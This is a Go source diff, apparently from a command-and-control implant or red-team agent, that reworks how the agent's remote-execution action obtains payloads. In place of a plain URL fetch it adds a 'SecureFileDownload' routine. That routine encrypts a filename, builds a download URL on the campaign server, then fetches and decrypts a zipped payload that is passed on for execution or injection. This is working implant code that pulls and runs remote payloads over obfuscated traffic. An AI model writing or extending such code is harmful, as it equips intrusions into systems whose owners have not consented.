@@ -21,6 +21,7 @@ import (
 type Executor struct {
 	interactiveShell *InteractiveShell
 	httpClient       *http.Client
+	campaign         *campaign.Campaign
 }
 
 func MakeExecutor(campaign *campaign.Campaign) Executor {
@@ -37,6 +38,7 @@ func MakeExecutor(campaign *campaign.Campaign) Executor {
 	executor := Executor{
 		&interactiveShell,
 		httpClient,
+		campaign,
 	}
 	return executor
 }
@@ -275,9 +277,9 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 	exitCode := 0
 	var err error
 
-	url, ok := packetArgument["url"]
+	filename, ok := packetArgument["filename"]
 	if !ok {
-		return ret, fmt.Errorf("invalid packet arguments given: no url")
+		return ret, fmt.Errorf("invalid packet arguments given: no filename")
 	}
 	fileType, ok := packetArgument["type"]
 	if !ok {
@@ -292,13 +294,7 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 		return ret, fmt.Errorf("invalid packet arguments given: no injectInto")
 	}
 
-	res, err := e.httpClient.Get(url)
-	if err != nil {
-		return ret, err
-	}
-	defer res.Body.Close()
-
-	fileContent, err := ioutil.ReadAll(res.Body)
+	fileContent, err := e.SecureFileDownload(filename)
 	if err != nil {
 		return ret, err
 	}
@@ -311,6 +307,36 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 	ret["exitCode"] = strconv.Itoa(exitCode)
 
 	return ret, err
+}
+
+func (e *Executor) SecureFileDownload(filename string) ([]byte, error) {
+	coder := model.MakeCoder(e.campaign)
+
+	// Create secure url based on filename
+	filenameEncrypted, err := coder.EncryptDataB64([]byte(filename))
+	if err != nil {
+		return nil, err
+	}
+	url := e.campaign.ServerUrl + e.campaign.SecureDownloadPath + string(filenameEncrypted)
+
+	// Download
+	res, err := e.httpClient.Get(url)
+	if err != nil {
+		return nil, err
+	}
+	defer res.Body.Close()
+	data, err := ioutil.ReadAll(res.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	// Decrypt
+	decoded, err := coder.DecryptB64Zip(data)
+	if err != nil {
+		return nil, err
+	}
+
+	return decoded, nil
 }
 
 func (e *Executor) actionFiledownload(packetArgument model.PacketArgument) (model.PacketResponse, error) {
